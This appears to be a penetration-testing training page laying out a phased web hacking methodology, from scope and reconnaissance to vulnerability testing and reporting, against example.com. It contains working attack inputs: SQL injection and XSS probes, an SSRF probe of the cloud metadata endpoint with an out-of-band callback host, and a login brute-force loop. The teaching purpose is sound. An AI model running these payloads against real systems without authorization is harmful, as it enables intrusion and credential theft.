---
layout: training-page
title: "Web Hacking Methodology — Red Team Academy"
module: "Web Hacking"
tags:
  - methodology
  - web-pentest
  - recon
  - enumeration
  - workflow
page_key: "web-hacking-methodology"
render_with_liquid: false
---

# Web Hacking Methodology

A structured workflow for web application penetration testing — from initial scope definition and reconnaissance through vulnerability discovery, exploitation, and reporting. This methodology applies to bug bounties, internal assessments, and CTF web challenges.

## Phase 1 — Scope and Target Mapping

Define what is in scope before touching anything. For bug bounties, read the program policy carefully. For engagements, confirm the scope document.

```
# Define scope
TARGET=example.com
SCOPE="*.example.com"

# Create a working directory
mkdir -p ~/assessments/$TARGET/{recon,vulns,screenshots,burp,notes}
```

### Technology Fingerprinting

```
# Identify tech stack with whatweb
whatweb -a 3 https://example.com

# Or with Wappalyzer CLI
wappalyzer https://example.com

# Check response headers manually
curl -sI https://example.com | grep -i -E "server|x-powered|x-generator|set-cookie"
```

## Phase 2 — Reconnaissance

### Subdomain Enumeration

```
# Passive: certificate transparency
subfinder -d example.com -o subdomains.txt
amass enum -passive -d example.com -o subdomains-amass.txt

# Active DNS brute-force
ffuf -u https://FUZZ.example.com -w /opt/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -mc 200,301,302,403 -o subdomains-ffuf.json

# Merge and resolve
cat subdomains.txt subdomains-amass.txt | sort -u | dnsx -silent -o resolved.txt
```

### Web Asset Discovery

```
# HTTP probe all resolved subdomains
cat resolved.txt | httpx -silent -o live-hosts.txt

# Take screenshots of all live hosts
gowitness file -f live-hosts.txt -P screenshots/

# Enumerate content on each target
ffuf -u https://example.com/FUZZ -w /opt/seclists/Discovery/Web-Content/raft-medium-files.txt \
  -mc 200,201,301,302,403 -o content-discovery.json
```

### JavaScript and API Endpoint Extraction

```
# Extract endpoints from JS files
echo "https://example.com" | gau | grep "\.js$" | sort -u | xargs -I {} \
  curl -s {} | grep -oP "(?<=['\"])/[a-zA-Z0-9/_-]+" | sort -u

# Use hakrawler to crawl and extract links
echo "https://example.com" | hakrawler -depth 3 -plain

# Extract all URLs from Wayback Machine
echo "example.com" | waybackurls | tee wayback.txt
```

## Phase 3 — Attack Surface Analysis

Classify every entry point before starting to exploit. Entry points include:

- Query parameters and path segments in URLs
- POST body parameters (form data, JSON, XML)
- HTTP headers (Host, Referer, User-Agent, X-Forwarded-For, Origin, custom headers)
- Cookies and JWT tokens
- File upload fields
- WebSocket messages
- GraphQL queries and mutations

```
# Identify all parameters in captured traffic with paramspider
paramspider -d example.com -o params.txt

# Or extract from wayback URLs
cat wayback.txt | grep "?" | cut -d "?" -f 2 | tr "&" "\n" | \
  cut -d "=" -f 1 | sort -u > unique-params.txt
```

## Phase 4 — Vulnerability Testing

### Automated Scanning

```
# Nuclei — template-based scanning
nuclei -l live-hosts.txt -t ~/nuclei-templates/ -o nuclei-results.txt -severity medium,high,critical

# Nuclei — focused web vulnerability scan
nuclei -u https://example.com -t http/vulnerabilities/ -t http/exposures/ \
  -t http/default-logins/ -o nuclei-web.txt

# nikto — classic web server scan
nikto -h https://example.com -o nikto-output.txt
```

### Manual Testing Priority Order

Prioritize by likelihood of impact. Test in this order:

1. **Authentication and authorization** — login bypass, IDOR, forced browsing, privilege escalation
2. **Injection** — SQLi, SSTI, SSI, command injection in all input fields
3. **SSRF** — test URL parameters, Webhooks, import functions, and XML parsers
4. **XSS** — reflected, stored, DOM-based in all user-input reflection points
5. **File upload** — MIME bypass, filename traversal, content-type bypass
6. **Business logic** — price manipulation, race conditions, workflow bypass
7. **Information disclosure** — error messages, debug endpoints, stack traces
8. **Third-party integrations** — OAuth flows, API keys, webhook validation

### SQL Injection — Quick Test

```
# Manual probe
curl "https://example.com/items?id=1'"
curl "https://example.com/items?id=1 AND SLEEP(5)--"

# Automated with sqlmap
sqlmap -u "https://example.com/items?id=1" --batch --level 3 --risk 2 \
  --dbs -o --output-dir=./sqlmap-output
```

### SSRF — Quick Test

```
# Probe internal metadata and localhost
curl "https://example.com/fetch?url=http://169.254.169.254/latest/meta-data/"
curl "https://example.com/fetch?url=http://127.0.0.1:6379/info"

# Out-of-band detection with Burp Collaborator / interactsh
curl "https://example.com/fetch?url=https://YOUR_INTERACTSH_ID.oast.me"
```

### XSS — Quick Test

```
# Reflected XSS probe
curl "https://example.com/search?q=<script>alert(1)</script>"
curl "https://example.com/search?q=<img src=x onerror=alert(1)>"

# DOM XSS — test in browser console
document.getElementById("output").innerHTML = location.hash.slice(1)
# Then visit: https://example.com/page#<img src=x onerror=alert(document.domain)>
```

### Parameter Fuzzing

```
# Fuzz all discovered parameters with ffuf
ffuf -u "https://example.com/search?FUZZ=test" \
  -w /opt/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -mc 200 -fs 1234

# Fuzz parameter values for injection
ffuf -u "https://example.com/search?q=FUZZ" \
  -w /opt/seclists/Fuzzing/XSS/XSS-Jhaddix.txt -mc 200
```

## Phase 5 — Authentication Testing

```
# Test for default credentials
nuclei -u https://example.com -t http/default-logins/

# Brute-force login with ffuf
ffuf -u https://example.com/login -X POST \
  -d "username=admin&password=FUZZ" \
  -w /opt/seclists/Passwords/Common-Credentials/10k-most-common.txt \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -mc 302 -fs 1234

# Test for account enumeration via timing or response differences
for user in admin administrator root test user; do
  curl -s -o /dev/null -w "%{http_code} %{time_total} $user\n" \
    -X POST -d "username=$user&password=wrongpassword" https://example.com/login
done
```

## Phase 6 — API Testing

```
# Enumerate API endpoints
ffuf -u https://api.example.com/v1/FUZZ \
  -w /opt/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -mc 200,201,400,401,403,405

# Test all HTTP methods on discovered endpoints
for method in GET POST PUT PATCH DELETE OPTIONS HEAD; do
  echo -n "$method: "
  curl -s -o /dev/null -w "%{http_code}" -X $method https://api.example.com/v1/users
  echo
done

# Test IDOR by swapping IDs
curl -H "Authorization: Bearer TOKEN_A" https://api.example.com/v1/users/1002/profile
curl -H "Authorization: Bearer TOKEN_A" https://api.example.com/v1/users/1001/profile
```

## Phase 7 — Post-Exploitation and Impact Demonstration

Demonstrate impact clearly without causing damage. For each vulnerability:

- Capture a screenshot of the exploitation in action
- Document the exact request/response in Burp Suite
- Articulate the business impact (data accessed, accounts compromised, etc.)
- Stop at proof of concept — do not extract real PII or user data

```
# Export Burp Suite request as curl command for documentation
# In Burp: right-click request > Copy as curl command

# Take a screenshot with the vulnerability visible
chromium --headless --screenshot --window-size=1280,800 \
  "https://example.com/vuln?param=payload" screenshot.png
```

## Useful Burp Suite Extensions

- **ActiveScan++** — Extended active scanning checks
- **Autorize** — Automated IDOR and privilege escalation testing
- **JWT Editor** — Analyze and attack JWT tokens
- **Turbo Intruder** — High-speed fuzzing and race condition testing
- **Param Miner** — Discover unlinked and hidden parameters
- **CSPT Burp Extension** — Client-side path traversal discovery

## Resources

- OWASP Web Security Testing Guide — `owasp.org/www-project-web-security-testing-guide/`
- PayloadsAllTheThings — `github.com/swisskyrepo/PayloadsAllTheThings`
- HackTricks Web Hacking — `book.hacktricks.xyz/pentesting-web`
- PortSwigger Web Security Academy — `portswigger.net/web-security`
- Bug Bounty Hunting Methodology v4 — Jason Haddix — `github.com/jhaddix/tbhm`
